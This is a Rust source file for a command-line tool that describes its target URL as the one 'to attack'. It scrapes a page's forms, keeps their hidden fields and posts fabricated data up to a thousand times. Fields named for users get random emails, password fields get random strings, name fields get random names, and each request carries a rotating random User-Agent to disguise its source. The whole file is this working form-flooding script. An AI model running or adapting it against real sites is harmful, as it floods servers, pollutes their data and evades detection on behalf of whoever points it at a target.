mod randomgenerator;

use std::{collections::HashMap};
use getopts::Options;
use std::{thread, time::Duration, env, io::Read, str::FromStr};
use reqwest::IntoUrl;
use crabquery::{Document, Element};

fn main() {
    let args: Vec<String> = env::args().collect();
    let program = args[0].clone();

    let mut opts = Options::new();
    opts.optopt("u", "url", "URL to attack", "URL");
    opts.optopt("n", "num", "Number of hits", "HITS");
    opts.optopt("d", "delay", "delay in msec per request", "DELAY");

    let matches = match opts.parse(&args[1..]) {
        Ok(m) => { m }
        Err(f) => { panic!(f.to_string()) }
    };

    let url = matches.opt_str("u");

    let delay: i32 = match matches.opt_str("d") {
        Some(_) => FromStr::from_str(&matches.opt_str("d").unwrap()).unwrap(),
        None => 500
    };

    let num: i32 = match matches.opt_str("n") {
        Some(_) => FromStr::from_str(&matches.opt_str("n").unwrap()).unwrap(),
        None => 1000
    };


    match url {
        Some(_) => {
            process_page(&url.unwrap(), delay, num);
        }
        None => {
            print_usage(&program, opts);
            process_page(&"http://www.andydixon.com/form.html".to_string(), delay, num);
        }
    }
}

fn process_page(url: &String, delay: i32, num: i32) {
    let mut res = reqwest::blocking::get(url).unwrap();
    let mut body = String::new();
    let mut params: HashMap<String, String> = HashMap::new();
    let mut hidden_params: HashMap<String, String> = HashMap::new();
    let mut rng = rand::thread_rng();
    res.read_to_string(&mut body);

    let doc = Document::from(body.to_string());
    let forms = doc.select("form");

    for form in forms {
        println!("Hitting target {}", form.attr("action").unwrap());
        for element in form.select("input") {
            if element.attr("type").unwrap() == "hidden" {
                hidden_params.insert(element.attr("name").unwrap().to_string(), element.attr("value").unwrap().to_string());
            } else {
                params.insert(element.attr("name").unwrap().to_string(), "".to_string());
            }
        }

        for element in form.select("select") {
            params.insert(element.attr("name").unwrap().to_string(), "".to_string());
        }
        print!("X");
        let mut request_params: HashMap<String, String> = HashMap::new();
        for _ in 0..num {
            print!("Y");
            for (key, _) in &params {
                if key == "user" || key == "username" || key == "user_name" || key == "uname" || key == "email" || key == "em" || key == "e" || key == "u" || key == "login" {
                    request_params.insert(key.to_string(), randomgenerator::generate_email().to_string());
                } else if key == "pass" || key == "pword" || key == "pw" {
                    request_params.insert(key.to_string(), randomgenerator::generate_bollocks(8));
                } else if key == "name" {
                    request_params.insert(key.to_string(), randomgenerator::generate_name());
                } else if key == "name1" || key == "firstname" || key == "fname" || key == "first_name" {
                    request_params.insert(key.to_string(), randomgenerator::get_random_firstname());
                } else if key == "name2" || key == "lastname" || key == "lname" || key == "last_name" || key == "surname" {
                    request_params.insert(key.to_string(), randomgenerator::get_random_lastname());
                } else {
                    request_params.insert(key.to_string(), randomgenerator::generate_bollocks(randomgenerator::generate_random_i8() as i32));
                }
            }
            print!("Y");
            // Append hidden options
            for (key, value) in &hidden_params {
                request_params.insert(key.to_string(), value.to_string());
            }

            /**
            Do the needful here to send the request
            **/

            let client = reqwest::blocking::Client::new();
            let res = client.post(&url.to_string())
                .header("User-Agent", &randomgenerator::get_random_useragent())
                .form(&request_params)
                .send();
            match res {
                Ok(res) => println!("Response: {}", res.status()),
                Err(err) => println!("Error: {}", err)
            }
            println!("Clearing Params");
            request_params.clear();
            thread::sleep(Duration::from_millis(delay as u64));
            println!("End of loop");
        } // form attack loop
    } // Form selector
}

fn print_usage(program: &str, opts: Options) {
    let brief = format!("Usage: {} [options]", program);
    print!("{}", opts.usage(&brief));
}